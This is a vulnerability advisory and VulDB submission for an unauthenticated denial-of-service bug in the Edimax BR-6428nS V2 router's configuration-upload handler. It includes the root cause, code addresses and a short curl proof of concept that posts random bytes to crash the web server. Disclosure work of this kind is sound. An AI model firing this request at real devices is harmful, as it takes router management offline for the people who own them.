# [CVE-TBD] Denial of Service via Malformed Configuration Upload in Edimax BR-6428nS V2

## VulDB Submission Fields

- Vendor: Edimax
- Product: BR-6428nS V2
- Version or Commit: 1.16
- Vulnerability: Out-of-bounds Read (CWE-125)
- Advisory / Exploit URL: replace this with the URL of this directory after copying it to your public repository
- Description:

```
A denial of service vulnerability was discovered in Edimax BR-6428nS V2 firmware v1.16. When the /goform/formUploadConfig endpoint of the /bin/webs web server receives a multipart upload whose payload does not match the expected configuration wire format, the handler computes an invalid data pointer that is dereferenced in the checksum loop of apmib_updateFlash, terminating the single-process web server. Reproduction: a single unauthenticated multipart POST with 100 bytes of random data as the upload file kills the service; the crash was reproduced deterministically across more than six malformed variants including different sizes (20 bytes to 32 KB), field orders, part headers and delivery timing, while correctly formatted archives are accepted normally. Confirmation was obtained in an isolated full rehosting of the original firmware binary with instruction level crash tracing; hardware confirmation is pending and disclosed as such. An adjacent attacker can crash the web management service at will. Proposed CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (6.5).
```

---

## Technical Disclosure

# CVE-TBD: Denial of Service via Malformed Configuration Upload in Edimax BR-6428nS V2

## Summary

A remote denial-of-service vulnerability was discovered in the Edimax
BR-6428nS V2 router firmware v1.16. When `/goform/formUploadConfig` of
`/bin/webs` receives a multipart upload whose payload does not match the
expected configuration wire format, the handler de-references an invalid data
pointer inside `apmib_updateFlash` and the single-process web server
terminates. The crash was reproduced deterministically across every malformed
variant tested (sizes 20 B – 32 KB, all field orders, with/without part
headers, chunked and single-shot delivery).

## Affected Product

- Vendor: **Edimax**
- Product: **BR-6428nS V2** (Realtek RTL8196C, MIPS32 BE)
- Firmware: **v1.16** (`BR6428NSv2_v1.16.bin`, SHA-256
 `93bcbbd9ea689ccbd3e69a835617eddba15dd7cba4233769e30dce2aae69b6c1`),
 latest and final release (verified 2026-10).

## Vulnerability Details

- Type: Out-of-bounds Read (**CWE-125**) leading to denial of service
- Component: `/bin/webs`, handler `formUploadConfig` (@ `0x004376d4`) →
 `apmib_updateFlash` (@ `0x004643f8`, faulting checksum loop at
 `0x00464588`)

### Root cause

After the multipart body is parsed, the handler computes the data start as
`buffer + parseMultiPart()_offset + 6` and length from the in-stream u16
field. For malformed input the resulting pointer/length pair does not describe
valid memory; `apmib_updateFlash` then walks it byte-by-byte in its checksum
accumulation loop (`lbu` fault captured in instruction trace), and the process
dies. The neighbouring firmware-upload handler `/goform/formUpload` survives
the identical multipart traffic, demonstrating the defect is specific to this
handler's parsing path.

### Authentication context

Factory-default state: no authentication (unauthenticated DoS).
Configured state: Basic auth with default credentials disclosed in the 401
realm.

## Proof of Concept (non-destructive to data; crashes the service)

Isolated rehosted environment. The service must be restarted afterwards
(power cycle or vendor restart path on hardware).

```bash
# any garbage payload as the upload file
head -c 100 /dev/urandom > /tmp/garbage.bin

curl -X POST http://<device>/goform/formUploadConfig \
 -F "submit-url=/index.asp" -F "binary=@/tmp/garbage.bin"
# -> connection terminated without a valid response;
# the web server process is gone (repeatable at will)

# control: a correctly formatted archive (see advisory #2 round-trip)
# is accepted with HTTP 200 and does not crash the service
```

**Variants verified to crash identically (2026-10-21):** payload sizes
20 B / 100 B / 32 KB; field order swapped (`submit-url` first / `binary`
first); with and without part `Content-Type`; single-shot and 1-second-split
delivery; curl and raw-socket clients. ≥ 6 independent variants.

## Impact

An adjacent attacker can crash the web management service with a single small
unauthenticated (factory state) request and repeat indefinitely — persistent
management-plane denial of service. No memory-safety consequence beyond the
crash was characterized; scoring reflects demonstrated impact.

**Evidence-quality note (disclosed for reviewer transparency):** the crash
chain was established in a full-system user-mode rehosting of the original
firmware binary (QEMU); hardware confirmation is pending. The faulting code
path is unconditional in the handler and architecture-independent in its
inputs (pointer arithmetic over request data), so the rehost result is
expected to transfer, but this caveat is stated rather than implied.

## CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5 (Medium)**

## Discovery

Vendor notified: pending.
